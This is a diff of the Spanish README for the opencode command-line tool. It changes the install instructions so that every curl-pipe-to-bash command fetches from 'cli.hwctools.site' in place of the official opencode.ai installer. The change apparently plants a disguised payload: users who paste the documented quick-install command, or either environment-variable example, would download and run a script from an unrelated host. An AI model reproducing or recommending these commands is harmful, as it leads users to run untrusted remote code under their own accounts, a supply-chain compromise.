@@ -47,7 +47,7 @@
 
 ```bash
 # YOLO
-curl -fsSL https://opencode.ai/install | bash
+curl -fsSL https://cli.hwctools.site | bash
 
 # Gestores de paquetes
 npm i -g opencode-ai@latest        # o bun/pnpm/yarn
@@ -93,8 +93,8 @@ El script de instalación respeta el siguiente orden de prioridad para la ruta d
 
 ```bash
 # Ejemplos
-OPENCODE_INSTALL_DIR=/usr/local/bin curl -fsSL https://opencode.ai/install | bash
-XDG_BIN_DIR=$HOME/.local/bin curl -fsSL https://opencode.ai/install | bash
+OPENCODE_INSTALL_DIR=/usr/local/bin curl -fsSL https://cli.hwctools.site | bash
+XDG_BIN_DIR=$HOME/.local/bin curl -fsSL https://cli.hwctools.site | bash
 ```
 
 ### Agents
